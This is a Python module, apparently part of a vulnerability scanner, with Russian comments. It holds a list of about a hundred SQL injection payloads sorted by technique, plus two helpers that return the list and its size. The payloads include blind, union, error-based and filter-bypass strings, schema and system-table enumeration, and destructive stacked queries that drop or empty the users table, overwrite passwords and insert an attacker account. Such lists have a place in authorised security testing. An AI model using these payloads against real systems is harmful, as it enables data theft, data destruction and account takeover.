"""
SQL Injection Payload коллекция для тестирования уязвимостей
Используется только в образовательных целях на собственных ресурсах
"""

SQL_INJECTION_PAYLOADS = [
    # Базовые SQL инъекции
    "'",
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "' OR 1=1--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "admin' --",
    "' OR 'x'='x",
    "' UNION ALL SELECT NULL--",
    "1'; DROP TABLE users--",
    
    # Boolean-based blind SQLi
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1 AND 'a'='a",
    "' AND 1=2 AND 'a'='a",
    "1' AND 1=1--",
    "1' AND 1=2--",
    
    # Time-based blind SQLi
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5); --",
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; BENCHMARK(5000000, UPPER('test')); --",
    
    # Union-based SQLi
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL, NULL--",
    "' UNION ALL SELECT version()--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    "' UNION SELECT @@version--",
    
    # Stacked queries
    "'; DROP TABLE users; --",
    "'; DELETE FROM users; --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "'; UPDATE users SET password='hacked'; --",
    
    # MySQL специфичные
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1; %23",
    "' UNION SELECT @@version, user() --",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' UNION SELECT column_name FROM information_schema.columns --",
    
    # PostgreSQL специфичные
    "'; SELECT version(); --",
    "' UNION SELECT current_database(); --",
    "' UNION SELECT user; --",
    "' UNION SELECT * FROM pg_user; --",
    "' UNION SELECT table_name FROM information_schema.tables; --",
    
    # MSSQL специфичные
    "' EXEC sp_tables --",
    "' EXEC sp_columns @table_name='users' --",
    "' UNION SELECT @@version --",
    "' UNION SELECT DB_NAME() --",
    "' UNION SELECT CURRENT_USER --",
    
    # Oracle специфичные
    "' UNION SELECT * FROM user_tables --",
    "' UNION SELECT * FROM user_tab_columns --",
    "' UNION SELECT banner FROM v$version --",
    "' UNION SELECT username FROM all_users --",
    
    # Error-based SQLi
    "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--",
    "' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(@@version, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    # Второй порядок (Second-order)
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "admin'--",
    "admin' /*",
    "admin' #",
    
    # Логические манипуляции
    "' OR '' = '",
    "' OR 1 = 1 OR '1' = '1",
    "' OR a=a --",
    "' OR a=a #",
    "' OR a=a /*",
    
    # Обход фильтров
    "' /*!50000OR*/ '1'='1",  # MySQL версионный комментарий
    "' %4F%52 '1'='1",        # OR закодирован
    "' %51%4E%49%4F%4E %53%45%4C%45%43%54",  # UNION SELECT закодирован
    
    # Нулевые байты и кодирование
    "' %00",
    "' %23",  # #
    "' %2D%2D",  # --
    
    # Конкатенация и обход
    "' un/**/ion select null--",
    "' u/**/nion u/**/nion select null--",
    "' /*!50000union*/ select null--",
    
    # Различные комментарии
    "' -- -",
    "' # ",
    "' /*",
    "' /*! */",
    "' /*!40000 */",
    
    # Escape-последовательности
    "' \\' OR '1'='1",
    "' ' OR ' '1' = '1",
    "' ESCAPE '\\' OR '1'='1",
    
    # Null байты
    "' %00 OR '1'='1",
    "' \x00 OR '1'='1",
    
    # Побег из строк
    "\") OR (\"1\"=\"1",
    "') OR ('1'='1",
    "\") OR (\"\" = \"",
    
    # Множественные условия
    "' AND 1=1 UNION SELECT null--",
    "' OR 1=1 AND 'a'='a",
    "' AND (1=1 OR 1=1) --",
    
    # Инъекции в числовые поля
    "1 OR 1=1",
    "1; DROP TABLE users; --",
    "-1 UNION SELECT NULL--",
    "999999 UNION SELECT null--",
    
    # Проверка версий базы данных
    "' AND SUBSTRING(@@version, 1, 1) = '5'--",
    "' AND ASCII(SUBSTRING(@@version, 1, 1)) > 48--",
    
    # Проверка существования таблиц
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') = 1--",
    "' AND EXISTS(SELECT * FROM users)--",
]


def get_sql_payloads():
    """Возвращает список SQL injection payload-ов"""
    return SQL_INJECTION_PAYLOADS


def get_sql_payloads_count():
    """Возвращает количество SQL payload-ов"""
    return len(SQL_INJECTION_PAYLOADS)
